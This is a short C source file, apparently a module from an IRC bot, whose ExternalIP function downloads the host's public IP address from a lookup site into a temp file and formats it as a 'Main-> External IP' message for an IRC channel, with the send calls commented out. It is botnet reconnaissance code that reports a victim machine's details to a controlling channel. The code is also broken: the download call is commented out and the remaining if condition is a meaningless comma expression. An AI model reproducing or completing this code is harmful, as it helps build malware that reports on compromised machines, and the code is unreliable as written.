#include "include.h"
#include "extern.h"

int ExternalIP(SOCKET Sock, char *szChannel) 
{ 
   DWORD dwRet = 0; 
   HANDLE hHandle; 
   char szIP[16] = {0}; 
   char szTempPath[MAX_PATH] = {0}; 
   char szTempFile[MAX_PATH] = {0}; 
   char szSendBuffer[512] = {0}; 
   if (!szChannel) 
      return false; 

   GetTempPath(sizeof(szTempPath) - 1, szTempPath); 
   GetTempFileName(szTempPath, "Temp", 0, szTempFile); 
 //  if (URLDownloadToFile(NULL, "http://www.whatismyip.org", szTempFile, 0, NULL) == S_OK) 

   if (NULL, "http://www.whatismyip.org", szTempFile, 0, NULL) 
   { 
      hHandle = CreateFile(szTempFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); 
      if (hHandle != INVALID_HANDLE_VALUE) 
      { 
         ReadFile(hHandle, szIP, sizeof(szIP) - 1, &dwRet, NULL); 
         _snprintf(szSendBuffer, sizeof(szSendBuffer) - 1, "Main-> External IP: %s", szIP); 
        /* IrcMsg(Sock, "PRIVMSG", szChannel, szSendBuffer); 
		 irc_privmsg(Target, "Main-> External IP: %s", szIP);*/
         CloseHandle(hHandle); 
      } 
   } 
   return true; 
} 

